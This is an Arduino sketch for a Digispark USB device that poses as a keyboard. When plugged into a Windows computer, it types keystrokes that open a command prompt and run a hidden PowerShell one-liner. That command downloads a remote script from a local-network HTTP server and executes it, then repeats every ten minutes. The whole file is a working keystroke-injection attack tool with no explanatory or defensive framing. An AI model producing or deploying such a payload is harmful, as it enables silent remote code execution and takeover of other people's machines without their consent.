#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED
}


void loop() {
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);  
  digitalWrite(1, LOW);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
  
  DigiKeyboard.sendKeyStroke(0);
  // ---------------------------------------------------
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  //DigiKeyboard.delay(50);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.13:8080/example/example.ps1');");
  
  DigiKeyboard.println("exit");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // ---------------------------------------------------
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(600000);
}
